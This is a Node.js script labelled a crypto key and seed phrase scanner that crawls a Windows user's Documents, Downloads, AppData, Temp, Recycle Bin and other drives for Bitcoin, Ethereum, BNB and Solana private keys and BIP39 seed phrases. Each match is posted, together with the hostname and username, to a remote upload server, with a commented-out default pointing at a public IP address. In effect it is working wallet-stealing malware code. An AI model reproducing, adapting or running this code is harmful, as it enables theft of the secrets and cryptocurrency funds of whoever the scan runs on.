#!/usr/bin/env node
"use strict";

const fs = require("node:fs/promises");
const path = require("node:path");
const os = require("node:os");
const http = require("node:http");
const https = require("node:https");

const args = process.argv.slice(2);

function getArg(name, fallback) {
  const idx = args.indexOf(name);
  if (idx >= 0 && idx + 1 < args.length) return args[idx + 1];
  return fallback;
}

function hasFlag(name) {
  return args.includes(name);
}

const getLocalIP = () => {
  const nets = os.networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === 'IPv4' && !net.internal) {
        return net.address;
      }
    }
  }
  return 'unknown';
};

const scanDateJST = new Date();
const dateStr = scanDateJST.toLocaleDateString('en-CA', { timeZone: 'Asia/Tokyo' });
const timeStr = scanDateJST.toLocaleTimeString('en-GB', { timeZone: 'Asia/Tokyo', hour12: false }).replace(/:/g, '-');
const localIP = getLocalIP();

const txtMaxKB = Number(getArg("--txt-max-kb", "30"));
const docMaxKB = Number(getArg("--doc-max-kb", "50"));
const pauseEvery = Number(getArg("--pause-every", "500"));
const pauseMs = Number(getArg("--pause-ms", "75"));
const dirConcurrency = Number(getArg("--dir-concurrency", "16"));
const contentScanLimitKB = Number(getArg("--content-limit-kb", "100"));
const showPreview = hasFlag("--show-preview");
// const serverUrl = getArg("--server-url", process.env.SCAN_SERVER_URL || "http://192.166.82.108:8080/upload-result");
const serverUrl = getArg("--server-url", process.env.SCAN_SERVER_URL || "http://127.0.0.1:8080/upload-result");

const txtMaxBytes = Math.max(1, txtMaxKB) * 1024;
const docMaxBytes = Math.max(1, docMaxKB) * 1024;
const contentScanLimitBytes = Math.max(1, contentScanLimitKB) * 1024;

// Skip patterns for files (keep for filtering within allowed dirs)
const skipBaseName = /^(readme|license|licence|copying|changelog|authors|notice)(\..*)?$/i;

// Blockchain patterns for private keys and seed phrases
const patterns = {
  // Bitcoin
  bitcoin: {
    wif: /\b([5KL][1-9A-HJ-NP-Za-km-z]{50,52})\b/g,
    hex: /\b([0-9a-fA-F]{64})\b/g,
    mini: /\b([A-Za-z0-9]{22,30})\b/g,
    bip38: /\b(6P[1-9A-HJ-NP-Za-km-z]{56,58})\b/g
  },
  // Ethereum & BNB (same format)
  ethereum: {
    privateKey: /\b(0x[0-9a-fA-F]{64})\b/g,
    raw: /\b([0-9a-fA-F]{64})\b/g,
    json: /"ciphertext":"([0-9a-f]+)"/g
  },
  // Solana
  solana: {
    base58: /\b([1-9A-HJ-NP-Za-km-z]{87,88})\b/g,
    base64: /\b([A-Za-z0-9+/]{88,100}={0,2})\b/g
  }
};

const skipWords = new Set([
  "and", "but", "the", "not", "would", "with", "which", "what", "where", 
  "that", "just", "for", "he", "she", "they", "him", "her", "them", 
  "his", "their", "than", "more", "can", "each"
]);

function detectSeedPhrase(content) {
  // Match sequences of 12, 15, 18, 21, or 24 words (each 3-8 letters)
  // Pattern: word (space word) repeated N-1 times
  const patterns = {
    12: /\b([a-z]{3,8}\s+){11}[a-z]{3,8}\b/g,
    15: /\b([a-z]{3,8}\s+){14}[a-z]{3,8}\b/g,
    18: /\b([a-z]{3,8}\s+){17}[a-z]{3,8}\b/g,
    21: /\b([a-z]{3,8}\s+){20}[a-z]{3,8}\b/g,
    24: /\b([a-z]{3,8}\s+){23}[a-z]{3,8}\b/g
  };
  
  let allMatches = "";

  // Check each pattern length
  for (const [length, pattern] of Object.entries(patterns)) {
    const matches = content.match(pattern);
    if (matches && matches.length > 0) {
      for (const match of matches) {
        const trimmedMatch = match.trim().toLowerCase();
        const words = trimmedMatch.split(/\s+/);

        const hasSkipWord = words.some(word => skipWords.has(word));

        if (!hasSkipWord) {
          allMatches += match + "\\";
        }
      }
      allMatches = allMatches.replace(/\n/g, " ");
      return allMatches.trim().toLowerCase();
    }
  }
  
  return null;
}

function isSuspiciousContext(filePath) {
  const suspiciousPaths = [
    'node_modules/',      // Package files - usually hashes
    'package.json',       // Dependency hashes
    'SHASUM',            // Checksum files
    'metadata.json',     // Metadata IDs
    'audit.json',        // Audit fingerprints
    '.log',              // Log files often contain hashes
    'cache/',            // Cache keys
    'storage.json',      // Storage IDs
    'checksums.json',    // Checksum values
    '.next/',            // Next.js build cache
    'venv/',             // Python virtual env
    '__pycache__/'       // Python cache
  ];
  
  return suspiciousPaths.some(pattern => filePath.includes(pattern));
}

function couldBeRealPrivateKey(hexString) {
  const clean = hexString.replace(/^0x/, '');
  if (!/^[0-9a-f]{64}$/i.test(clean)) return false;
  
  // Convert to buffer
  const buffer = Buffer.from(clean, 'hex');
  
  // Check if it's a valid secp256k1 private key (Bitcoin/Ethereum)
  // Must be > 0 and < curve order (FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141)
  const maxOrder = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');
  const value = BigInt('0x' + clean);
  
  if (value === 0n) return false;
  if (value >= maxOrder) return false;
  
  return true;
}

function detectPrivateKeys(content, filePath = '') {
  const found = [];
  
  // Skip known false-positive contexts
  const skipContexts = [
    /SHASUM/i,
    /checksum/i,
    /hash/i,
    /metadata/i,
    /audit/i,
    /cache/i,
    /fingerprint/i,
    /version/i,
    /id["']?\s*:/,
    /uuid/i
  ];
  
  // Skip entire file if it's in suspicious path
  const skipPaths = [
    'node_modules',
    'package.json',
    'checksums.json',
    'metadata.json', 
    'audit.json',
    'storage.json',
    '.log',
    '.next',
    'venv',
    '__pycache__'
  ];
  
  if (skipPaths.some(p => filePath.includes(p))) {
    return found;
  }
  
  // Check if content looks like it contains hashes (not keys)
  if (skipContexts.some(pattern => pattern.test(content))) {
    // Still scan but with higher threshold
  }
  
  // Bitcoin WIF (these are almost always real keys)
  const wifMatches = content.match(patterns.bitcoin.wif);
  if (wifMatches) {
    for (const match of wifMatches) {
      // WIF keys have specific format and checksum
      if (match.length >= 51 && match.length <= 52) {
        found.push({ type: "Bitcoin WIF", value: match, confidence: "HIGH" });
      }
    }
  }
  
  // Ethereum/BNB private keys (0x...)
  const ethMatches = content.match(patterns.ethereum.privateKey);
  if (ethMatches) {
    for (const match of ethMatches) {
      const clean = match.replace(/^0x/, '');
      // Additional validation for Ethereum keys
      if (couldBeRealPrivateKey(clean)) {
        found.push({ type: "Ethereum/BNB Private Key", value: match, confidence: "HIGH" });
      }
    }
  }
  
  // Raw 64-char hex - MOST LIKELY FALSE POSITIVES
  const hexMatches = content.match(patterns.bitcoin.hex);
  if (hexMatches) {
    for (const match of hexMatches) {
      if (!match.match(/^[0-9a-f]{64}$/i)) continue;
      
      // Only flag if it passes strict validation AND isn't in a suspicious context
      if (couldBeRealPrivateKey(match) && !isSuspiciousContext(filePath)) {
        // Check if it appears in a crypto-relevant context
        const cryptoKeywords = /private\s*key|secret|wallet|mnemonic|seed|keystore/i;
        if (cryptoKeywords.test(content.substring(0, 500))) {
          found.push({ type: "Raw Hex Private Key (64 chars)", value: match, confidence: "MEDIUM" });
        } else {
          found.push({ type: "Potential Raw Hex Key - Verify Manually", value: match, confidence: "LOW" });
        }
      }
    }
  }
  
  return found;
}

function csvEscape(v) {
  const s = String(v ?? "");
  if (s.includes(",") || s.includes('"') || s.includes("\n")) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function sendResultToServer(url, payload) {
  return new Promise((resolve, reject) => {
    let parsed;
    try {
      parsed = new URL(url);
    } catch (err) {
      reject(new Error(`Invalid server URL: ${url}`));
      return;
    }

    const body = JSON.stringify(payload);
    
    const transport = parsed.protocol === "https:" ? https : http;
    
    const options = {
      hostname: parsed.hostname,
      port: parsed.port || 55000,
      path: parsed.pathname,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(body),
        "X-Host": os.hostname(),
        "X-User": os.userInfo().username
      },
      timeout: 30000
    };

    const req = transport.request(options, (res) => {
      const chunks = [];
      res.on("data", (chunk) => chunks.push(chunk));
      res.on("end", () => {
        const responseText = Buffer.concat(chunks).toString("utf8");
        if (res.statusCode >= 200 && res.statusCode < 300) {
          resolve({ statusCode: res.statusCode, body: responseText });
        } else {
          reject(new Error(`Server responded ${res.statusCode}: ${responseText || "No response body"}`));
        }
      });
    });

    req.on("timeout", () => {
      req.destroy(new Error("Request timed out"));
    });
    req.on("error", (err) => {
      reject(new Error(`Connection failed: ${err.message}. Make sure server is running on ${url}`));
    });
    
    req.write(body);
    req.end();
  });
}


async function getDrives() {
  const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const checks = letters.split("").map(async (l) => {
    const root = `${l}:\\`;
    try {
      await fs.access(root);
      return root;
    } catch {
      return null;
    }
  });
  const result = await Promise.all(checks);
  return result.filter(Boolean);
}

async function scanFileContent(filePath, maxBytes) {
  try {
    const content = await fs.readFile(filePath, "utf8");
    const limitedContent = content.slice(0, maxBytes);
    
    const privateKeys = detectPrivateKeys(limitedContent);
    const seedPhrase = detectSeedPhrase(limitedContent);
    
    let preview = "";
    if (showPreview && (privateKeys.length > 0 || seedPhrase)) {
      preview = limitedContent.slice(0, 500).replace(/\n/g, " ").replace(/"/g, '""');
    }
    
    return { privateKeys, seedPhrase, preview };
  } catch (err) {
    // Binary file or encoding error
    if (err.code === "ENOENT") return null;
    if (err.code === "EACCES") return null;
    if (err.code === "EISDIR") return null;
    // For binary files, just return null
    return null;
  }
}

// Define specific directories to scan on Windows
function getTargetDirectories() {
  const username = os.userInfo().username;
  const userProfile = os.homedir();
  
  const targets = [   
    // C:\Users\<YourUsername>\Documents
    path.join(userProfile, "Documents"),
    
    // C:\Users\<YourUsername>\Downloads
    path.join(userProfile, "Downloads"),
    
    // Pictures, Music, Videos
    path.join(userProfile, "Pictures"),
    path.join(userProfile, "Music"),
    path.join(userProfile, "Videos"),
    
    // C:\Users\<YourUsername>\AppData\Local\Temp
    path.join(userProfile, "AppData", "Local", "Temp"),
    
    // C:\Users\<YourUsername>\AppData\Roaming
    path.join(userProfile, "AppData", "Roaming"),
    
    // C:\Windows\Temp
    "C:\\Windows\\Temp",
    
    // Recycle Bin (special handling - note: may require admin rights)
    `C:\\$Recycle.Bin`,
    
    // Also include other drive roots if they exist
  ];
  
  return targets;
}

async function scanDirectory(targetPath, state) {
  console.log(`  Scanning: ${targetPath}`);
  const queue = [targetPath];
  let active = 0;

  return new Promise((resolve) => {
    const pump = async () => {
      while (active < dirConcurrency && queue.length > 0) {
        const currentDir = queue.shift();
        active++;
        scanOneDir(currentDir)
          .catch(() => {})
          .finally(() => {
            active--;
            setImmediate(pump);
          });
      }
      if (active === 0 && queue.length === 0) resolve();
    };

    const scanOneDir = async (dirPath) => {
      let dir;
      try {
        dir = await fs.opendir(dirPath);
      } catch {
        return;
      }

      for await (const dirent of dir) {
        const fullPath = path.join(dirPath, dirent.name);

        if (dirent.isDirectory()) {
          // Don't skip any subdirectories within allowed paths
          queue.push(fullPath);
          continue;
        }

        if (!dirent.isFile()) continue;
        const lowerName = dirent.name.toLowerCase();
        const ext = path.extname(lowerName);
        
        // Check if it's a text file
        const textExtensions = [".txt", ".doc", ".docx"];
        if (!textExtensions.includes(ext)) continue;

        state.checked += 1;
        if (state.checked % pauseEvery === 0) {
          await sleep(pauseMs);
        }

        const nameNoExt = path.parse(dirent.name).name;
        if (skipBaseName.test(nameNoExt)) continue;

        try {
          const st = await fs.stat(fullPath);
          const maxForExt = ext === ".txt" ? txtMaxBytes : docMaxBytes;
          
          if (st.size <= maxForExt && st.size <= contentScanLimitBytes) {
            const scanResult = await scanFileContent(fullPath, contentScanLimitBytes);
            
            if (scanResult && (scanResult.privateKeys.length > 0 || scanResult.seedPhrase)) {
              state.matched += 1;
              
              for (const key of scanResult.privateKeys) {
                const row = {
                  path: fullPath,
                  extension: ext,
                  sizeBytes: st.size,
                  lastWriteTime: st.mtime.toISOString(),
                  keyType: key.type,
                  keyValue: key.value,
                  seedPhrase: "",
                  preview: scanResult.preview
                };
                state.rows.push(row);
                await uploadRow(row, state);
              }
              
              if (scanResult.seedPhrase) {
                const row = {
                  path: fullPath,
                  extension: ext,
                  sizeBytes: st.size,
                  lastWriteTime: st.mtime.toISOString(),
                  keyType: "Seed Phrase (BIP39)",
                  keyValue: "",
                  seedPhrase: scanResult.seedPhrase,
                  preview: scanResult.preview
                };
                state.rows.push(row);
                await uploadRow(row, state);
              }
            }
          } else if (st.size <= maxForExt && st.size > contentScanLimitBytes) {
            if (state.largeFilesSkipped === undefined) state.largeFilesSkipped = 0;
            state.largeFilesSkipped++;
          }
        } catch {
          // Ignore inaccessible files.
        }
      }
    };

    pump();
  });
}

async function uploadRow(row, state) {
  state.uploadsAttempted += 1;
  try {
    await sendResultToServer(serverUrl, {
      host: os.hostname(),
      user: os.userInfo().username,
      generatedAt: new Date().toISOString(),
      row
    });
    state.uploadsSucceeded += 1;
  } catch (err) {
    state.uploadsFailed += 1;
    console.error(`❌ Failed to send result for ${row.path}: ${err.message}`);
  }
}

async function scanAllDrivesSpecificFolders(state) {
  const drives = await getDrives();
  
  for (const drive of drives) {
    console.log(`\n=== Scanning ${drive} ===`);
    
    // For C: drive, scan the specific directories
    if (drive === "C:\\") {
      const targets = getTargetDirectories();
      
      for (const target of targets) {
        // Check if directory exists before scanning
        try {
          await fs.access(target);
          await scanDirectory(target, state);
        } catch (err) {
          console.log(`  Skipping (not found/inaccessible): ${target}`);
        }
      }
    } else {
      // For other drives (D:, E:, etc.), scan entire drive but skip system directories
      console.log(`  Scanning entire ${drive} (excluding system dirs)`);
      await scanDirectory(drive, state);
    }
  }
}


async function main() {
  console.log("=".repeat(60));
  console.log("CRYPTO KEY & SEED PHRASE SCANNER (Targeted Windows Scan)");
  console.log("=".repeat(60));
  console.log(`Host: ${os.hostname()}`);
  console.log(`User: ${os.userInfo().username}`);
  console.log(`Scanning .txt <= ${txtMaxKB}KB, .doc/.docx <= ${docMaxKB}KB`);
  console.log(`Content scan limit: ${contentScanLimitKB}KB per file`);
  console.log("Patterns: Bitcoin, Ethereum, BNB, Solana private keys & BIP39 seed phrases");
  if (showPreview) console.log("Preview mode: ON (shows first 500 chars of matches)");
  console.log("\nTarget directories on C: drive:");
  const targets = getTargetDirectories();
  targets.forEach(t => console.log(`  - ${t}`));
  console.log("\nOther drives will be scanned entirely (excluding system dirs)");
  console.log("\nCollecting drives...");

  const drives = await getDrives();
  if (drives.length === 0) {
    console.error("No drives found.");
    process.exitCode = 1;
    return;
  }

  console.log(`Drives found: ${drives.join(", ")}`);

  const state = {
    checked: 0,
    matched: 0,
    rows: [],
    largeFilesSkipped: 0,
    uploadsAttempted: 0,
    uploadsSucceeded: 0,
    uploadsFailed: 0
  };

  await scanAllDrivesSpecificFolders(state);

  if (state.rows.length === 0) {
    console.log("\n⚠️  No private keys or seed phrases found.");
  } else {
    console.log(`\n🔐 Found ${state.rows.length} potential crypto keys/phrases!`);
  }

  console.log(`\nServer endpoint: ${serverUrl}`);
  console.log(`Uploads attempted: ${state.uploadsAttempted}`);
  console.log(`Uploads succeeded: ${state.uploadsSucceeded}`);
  console.log(`Uploads failed   : ${state.uploadsFailed}`);

  console.log("\n" + "=".repeat(60));
  console.log("SCAN COMPLETE");
  console.log("=".repeat(60));
  console.log(`Files scanned    : ${state.checked}`);
  console.log(`Matches found    : ${state.matched}`);
  console.log(`Large files (>${contentScanLimitKB}KB): ${state.largeFilesSkipped || 0}`);
}

main().catch((err) => {
  console.error(err?.stack || err);
  process.exitCode = 1;
});